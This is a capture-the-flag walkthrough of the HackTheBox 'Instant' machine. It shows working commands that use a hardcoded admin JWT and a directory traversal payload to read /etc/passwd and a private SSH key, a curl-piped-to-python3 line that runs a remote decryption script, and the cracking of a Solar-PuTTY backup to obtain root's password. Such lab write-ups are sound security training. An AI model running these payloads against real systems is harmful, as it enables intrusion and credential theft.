# Target
| Category       | Details                                        |
|----------------|------------------------------------------------|
| 📝 Name        | **Instant**                                    |
| 🏷 Type        | HTB Machine                                    |
| 🖥️ OS          | Linux                                          |
| 🎯 Difficulty  | Medium                                         |
| 🔗 URL         | https://app.hackthebox.com/machines/Instant    |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ nmap -sS -sC -sV $TARGET_IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-28 19:06 CET
Nmap scan report for 10.129.230.230
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
```

`nmap` detected `instant.htb` virtual host. Which could be confirmed with `curl`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl -I $TARGET_IP
HTTP/1.1 301 Moved Permanently
Date: Fri, 28 Feb 2025 18:08:16 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: http://instant.htb/
Content-Type: text/html; charset=iso-8859-1
```

Let's add it to `/etc/hosts` and re-scan HTTP.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ echo "$TARGET_IP instant.htb" | sudo tee -a /etc/hosts
[sudo] password for magicrc: 
10.129.230.230 instant.htb
```
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ nmap -sS -sC -sV -p80 instant.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-28 19:09 CET
Nmap scan report for instant.htb (10.129.230.230)
Host is up (0.74s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds
```

# Foothold
Having SSH and HTTP remotely available we will start with web browsing of http://instant.htb. On the main page we can see donwload button which leads us to http://instant.htb/downloads/instant.apk. Let's download it and use `jadx-gui` to decompile it and see if there is something interesting. Brief analysis shows that `com.instantlabs.instant` package contains couple of `android.app.Activity` one of which is quite interesting for us. It seems that `AdminActivities` (which actually is not `android.app.Activity` but it does not matter) contains method that has hardcoded JWT token.

![Hardcoded JWT](images/jadx-gui-hardcoded-jwt.png)

Let's decode it.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ ADMIN_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA && \
echo $ADMIN_TOKEN | cut -d "." -f2 | base64 -d
{"id":1,"role":"Admin","walId":"f0eca6e5-783a-471d-9d8f-0162cbc900db","exp":33259303656} 
```

This seems to be an admin token. Additionally to that we have discovered `mywalletv1.instant.htb` subdomain (in REST call to `http://mywalletv1.instant.htb/api/v1/view/profile`). Let's add it to our `/etc/hosts` and check if this token valid.

```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ echo "$TARGET_IP mywalletv1.instant.htb" | sudo tee -a /etc/hosts
10.129.230.230 mywalletv1.instant.htb
```
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/view/profile -H "Authorization: $ADMIN_TOKEN"
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
```

Token is valid! Let's grep thru whole decompiled code looking for all occurrences of `instant.htb` string.

![Hardcoded JWT](images/jadx-gui-instant.htb_grep.png)

We have found additional REST endpoints for `mywalletv1` and Swagger endpoint as well! Swagger might provide us a lot of interesting information, so let's add it to `/etc/hosts` and investigate `http://swagger-ui.instant.htb` with web browser.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ echo "$TARGET_IP swagger-ui.instant.htb" | sudo tee -a /etc/hosts
10.129.230.230 swagger-ui.instant.htb
```

We have found 4 additional `admin` enpoints, let's check if our JWT token is still valid for those. 
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/admin/list/users -H "Authorization: $ADMIN_TOKEN"
{"Status":200,"Users":[{"email":"admin@instant.htb","role":"Admin","secret_pin":87348,"status":"active","username":"instantAdmin","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},{"email":"shirohige@instant.htb","role":"instantian","secret_pin":42845,"status":"active","username":"shirohige","wallet_id":"458715c9-b15e-467b-8a3d-97bc3fcf3c11"}]}
```

It is! And we have discovered `shirohige@instant.htb` user, no credentials yet so let's keep digging. Let's check another `admin` endpoint.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/admin/view/logs -H "Authorization: $ADMIN_TOKEN"
{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

It seems that there are some logs in `/home/shirohige/logs/1.log` file and we could use another endpoint to view those.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=1.log -H "Authorization: $ADMIN_TOKEN"
{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
```

It looks that this endpoint is able to read a file with name provided in `log_file_name` query param. Our next natural step should be to check for directory traversal vulnerability.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd -H "Authorization: $ADMIN_TOKEN"
{"/home/shirohige/logs/../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}
```

And it's vulnerable! Let's try to exfiltrate private SSH key.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa -H "Authorization: $ADMIN_TOKEN"
{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","<SNIP>","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```

We have got a key! Let's put server response thru simple piped text processing and use this key to access target over SSH.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ curl -s http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa -H "Authorization: $ADMIN_TOKEN" | jq -r '."\/home\/shirohige\/logs\/..\/.ssh\/id_rsa"[]' > id_rsa && \ 
chmod 600 id_rsa && \
ssh -i id_rsa shirohige@instant.htb
The authenticity of host 'instant.htb (10.129.230.230)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
shirohige@instant:~$
```

Foothold gained! Let's grab user flag and continue with escalation of privileges.
```
shirohige@instant:~$ cat /home/shirohige/user.txt 
********************************
```

# Privileges escalation
We will use `linepeas.sh` and see if will find anything interesting. No immediate PE vectors were found, but interesting backup file has been located.
```
-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat
```
```
shirohige@instant:~$ cat /opt/backups/Solar-PuTTY/sessions-backup.dat
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

With quick [search](https://www.google.com/search?q=Solar-PuTTY+sessions-backup.dat) we have found out that SolarPuTTY’s sessions files could be decrypted to retrieve plain-text credentials. Let's exfiltrate this file and dig deeper locally.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ scp -i id_rsa shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat .
```

There are multiple great tools to decrypt this file:
- [xHacka/SolarPuttyDecrypt.py](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5)
- [VoidSec/SolarPuttyDecrypt C#](https://github.com/VoidSec/SolarPuttyDecrypt/blob/master/SolarPuttyDecrypt/Program.cs)
- [VoidSec/SolarPuttyDecrypt Metasploit module](https://github.com/VoidSec/SolarPuttyDecrypt/blob/master/solar_putty.rb)

As we are not using Windows and we are not attacking this target with Metasploit, we will got with [xHacka/SolarPuttyDecrypt.py](https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5) script.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ python3 -m venv instant.htb && \
source instant.htb/bin/activate && \
pip install pycryptodome && \
bash -c "curl -sL https://gist.githubusercontent.com/xHacka/052e4b09d893398b04bf8aff5872d0d5/raw/8e76153cd2d115686a66408f6e2deff7d3740ecc/SolarPuttyDecrypt.py | python3 - sessions-backup.dat /usr/share/wordlists/rockyou.txt" && \
deactivate && \
rm -fr instant.htb
Collecting pycryptodome
  Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Using cached pycryptodome-3.21.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.21.0
[104] password='estrella'           

{"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"*****************","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
```

We have managed to decrypt `root` password! Let's use it to gain access with SSH.
```
┌──(magicrc㉿perun)-[~/attack/HTB Instant]
└─$ ssh root@instant.htb 
root@instant.htb's password: 
Permission denied, please try again.
root@instant.htb's password:
```

It seems that we can not login as `root`. Now this does not immediately mean that password is incorrect, as `PermitRootLogin` (in `/etc/ssh/sshd_config`) might be set to `prohibit-password` (default) or `no`. We have however access to target as `shirohige@instant` and thus we could use this session to switch user to `root`.
```
shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige# id
uid=0(root) gid=0(root) groups=0(root)
``` 

And we have made it! Privileges elevated, let's grab root flag and logout.
```
root@instant:/home/shirohige# cat /root/root.txt 
********************************
```